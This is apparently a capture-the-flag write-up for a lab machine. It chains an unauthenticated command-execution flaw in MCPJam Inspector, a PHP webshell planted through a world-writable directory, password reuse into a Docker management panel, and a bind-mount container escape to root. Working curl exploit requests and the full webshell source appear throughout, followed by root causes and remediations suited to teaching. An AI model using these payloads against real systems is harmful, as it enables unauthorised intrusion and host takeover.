02

Foothold — CVE-2026-23744 (MCPJam Inspector RCE)

MCPJam Inspector versions ≤ 1.4.2 bind their HTTP API to 0.0.0.0 by default and expose /api/mcp/connect without authentication. The endpoint is meant to spawn an MCP server process using a command + args supplied by the caller — but nothing validates that the command is an actual MCP server. Supplying an arbitrary shell command results in command execution on the host, blind (no output returned, since the process isn't speaking the MCP protocol over stdio).

CVE: CVE-2026-23744  |  Advisory: GHSA-232v-j27c-5pp6  |  CVSS: 9.8 (Critical) — Network, Low complexity, No privileges, No user interaction

Confirm the endpoint is reachable and executing commands

curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -X POST -H "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test1"}'
{"success":false,"error":"Connection failed for server test1: MCP error -32000: Connection closed","details":"MCP error -32000: Connection closed"}

The "Connection closed" error confirms the process was spawned (and immediately exited, since id doesn't speak MCP over stdio) — command execution is happening, just blind.

Reverse shell

Why this matteredA "no output" error can still confirm code execution — the absence of an expected protocol handshake is itself a signal that a process ran and exited, not proof that nothing happened.

05

Lateral Movement — PHP Webshell via World-Writable Directory

/privatebin-data/data/ is drwxrwxrwx with no sticky bit, meaning any user can delete files inside it regardless of file ownership (only directory write permission matters for unlink on Linux). traffic_limiter.php is require'd by PrivateBin on every POST request (used for rate limiting).

ls -la /privatebin-data/data/traffic_limiter.php
-rw-r----- 1 root operator 132 Feb 16 08:34 /privatebin-data/data/traffic_limiter.php
rm -f /privatebin-data/data/traffic_limiter.php
cat > /privatebin-data/data/traffic_limiter.php << 'EOF'
<?php
if(isset($_GET["x"])){
    header("Content-Type: text/plain");
    echo shell_exec($_GET["x"]);
    exit;
}
$GLOBALS["traffic_limiter"] = array();
EOF

Trigger the webshell

curl -s "http://127.0.0.1:8080/?x=id" -X POST -d "t=1"
uid=65534(nobody) gid=82(www-data) groups=82(www-data)

Code execution confirmed inside the PrivateBin container (the host directory is bind-mounted into the container, so the file swap takes effect immediately).

Read PrivateBin's config for leaked credentials

curl -s "http://127.0.0.1:8080/?x=cat+/srv/cfg/conf.php" -X POST -d "t=1"
[model]
; example of DB configuration for MySQL
; Temporarily disabling while we migrate to new server for loadbalancing
;class = Database
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
tbl = "privatebin_"
usr = "privatebin"
pwd = "<PRIVATEBIN_DB_PASSWORD>"
opt[12] = true

A commented-out MySQL migration block leaks a reusable password.

Why this matteredA directory that's world-writable but not sticky-bit-protected is exploitable even when individual files inside it are locked down (root:operator, mode 640) — deleting and recreating the file bypasses per-file permissions entirely, since unlink only checks the containing directory.

Privilege Escalation — Arcane Admin via Password Reuse

Arcane's default admin account is arcane / a default password. The box's admin changed the password during setup — but reused the PrivateBin MySQL password.

curl -s http://127.0.0.1:3552/api/auth/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"arcane","password":"<PRIVATEBIN_DB_PASSWORD>"}'
{
  "success": true,
  "data": {
    "token": "<ARCANE_JWT>",
    "user": {
      "username": "arcane",
      "displayName": "Arcane Admin",
      "roles": ["admin"]
    }
  }
}

Full admin JWT obtained.

TOKEN="<ARCANE_JWT>"
curl -s http://127.0.0.1:3552/api/environments -H "Authorization: Bearer $TOKEN"
{"success":true,"data":[{"id":"0","name":"Local Docker","apiUrl":"http://localhost:3552","status":"online","enabled":true}]}

Environment ID = 0.

Why this matteredThe same password secured two unrelated services, one of which (Arcane) had root-equivalent capability — credential reuse across a low-value service and a high-value admin panel is one of the most common real-world privilege escalation patterns.
07

Root Flag — Docker Escape via Host Bind Mount

Arcane's admin API allows creating containers with arbitrary hostConfig.binds. Since the Arcane process (and the Docker daemon it talks to) runs as root, mounting / from the host into a new container grants full read/write access to the entire host filesystem.

curl -s 'http://127.0.0.1:3552/api/environments/0/containers' \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "rootread",
    "image": "mysql:latest",
    "entrypoint": ["sh", "-c", "cat /hostroot/root/root.txt > /hostroot/tmp/rf.txt && chmod 644 /hostroot/tmp/rf.txt"],
    "hostConfig": {
      "binds": ["/:/hostroot"]
    }
  }'
{
  "success": true,
  "data": {
    "id": "<CONTAINER_ID>",
    "name": "/rootread",
    "image": "mysql:latest",
    "status": "running"
  }
}

The container runs as root inside its own namespace, but with / bind-mounted at /hostroot, so writes to /hostroot/tmp/rf.txt land on the real host filesystem at /tmp/rf.txt, readable by ben.

cat /tmp/rf.txt
Root Flag
Why this matteredA Docker management UI that permits arbitrary hostConfig.binds is equivalent to root on the host for anyone who can authenticate to it — there's no meaningful containment left once bind-mounting the entire filesystem is possible.

Root Causes

  1. Insecure default binding — MCPJam Inspector listens on 0.0.0.0 with no auth on a process-spawning endpoint.
  2. Insecure file permissions — a world-writable directory without a sticky bit allowed arbitrary file replacement regardless of individual file ownership.
  3. Secret leakage in comments — a "disabled" config block still contained a live, reused password.
  4. Credential reuse — the same password secured two unrelated services, one of which had root-equivalent capability.
  5. Docker management UI as an unconstrained root primitive — any user who can create containers with arbitrary bind mounts via Arcane is equivalent to root on the host.
—

Remediations

  • Upgrade MCPJam Inspector to ≥ 1.4.3 and bind it to 127.0.0.1 only.
  • Set sticky bit (chmod +t) on shared/world-writable directories, or avoid 0777 permissions entirely.
  • Never leave credentials in "commented-out" config blocks — remove or rotate them.
  • Enforce unique passwords per service; consider a password manager / secrets vault.
  • Restrict who can reach Docker-management UIs like Arcane, and avoid granting arbitrary bind-mount privileges to non-trusted admins.
